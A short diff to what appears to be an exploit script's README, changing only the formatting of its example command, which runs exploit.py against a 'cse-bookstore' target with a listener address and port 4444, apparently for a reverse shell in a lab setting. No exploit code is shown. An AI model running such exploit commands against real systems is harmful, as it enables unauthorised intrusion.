@@ -13,4 +13,6 @@ options:
 
 **Example**
 
-``$ python3 exploit.py -u http://cse-bookstore -l 10.123.25.4 -p 4444``
+```
+$ python3 exploit.py -u http://cse-bookstore -l 10.123.25.4 -p 4444
+```
